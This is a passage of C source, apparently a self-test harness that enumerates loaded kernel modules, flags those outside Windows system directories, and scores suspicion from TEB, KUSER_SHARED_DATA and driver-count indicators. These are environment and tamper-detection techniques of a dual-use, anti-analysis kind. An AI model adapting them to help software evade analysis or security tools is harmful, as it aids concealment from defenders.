                             if(n7>='A'&&n7<='Z')n7+=32; if(n8>='A'&&n8<='Z')n8+=32; if(n9>='A'&&n9<='Z')n9+=32;
                             if(n1=='s'&&n2=='y'&&n3=='s'&&n4=='t'&&n5=='e'&&n6=='m'&&n7=='3'&&n8=='2'&&n9=='\\') h32=1;
                             if(n1=='w'&&n2=='i'&&n3=='n'&&n4=='d'&&n5=='o'&&n6=='w'&&n7=='s'&&n8=='\\') hW=1;}}
                         if(!h32&&!hW){if(nm<8&&nIdx<8){int ls=-1,L,n; const char* src;
                             for(L=0;L<64&&L<KMOD_NAME_LEN&&nm2[L];L++) if(nm2[L]=='\\') ls=L;
                             src=(ls>=0)?nm2+ls+1:nm2; for(n=0;n<63&&src[n];n++) xs->p7NonMsNames[nIdx][n]=src[n];
                             xs->p7NonMsNames[nIdx][n]=0; nIdx++;} nm++;}}
                     xs->p7NonMs=nm;}}
             {void* fb=kb;size_t fs=0; hF(HS_CURPROC,&fb,&fs,HS_MEM_RELEASE);} kb=0; exec_ok(xs);}
         else exec_fail(xs,"kmod alloc failed");} else exec_fail(xs,"missing stubs");}
    /* s7g: phase 7 verdict */
    {int sus=0; exec_step(xs,"s7g phase 7 verdict");
     if(xs->p7TebW32Callout) sus++; if(xs->p7KusdByte&1) sus++; if(xs->p7Outliers>0) sus++;
     if(xs->p7ExtAlive>0) sus++; if(xs->p7NonMs>5) sus++; xs->p7Suspect=sus; xs->p7Ran=1; exec_ok(xs);}

    /* all done */
    exec_step(xs,"s9 all stages passed"); exec_ok(xs);
    xs->operationalVendorCalls=0; xs->exitReason=0; return 0;
}

#endif /* HS_SELFTEST — verification harness excluded from production builds */

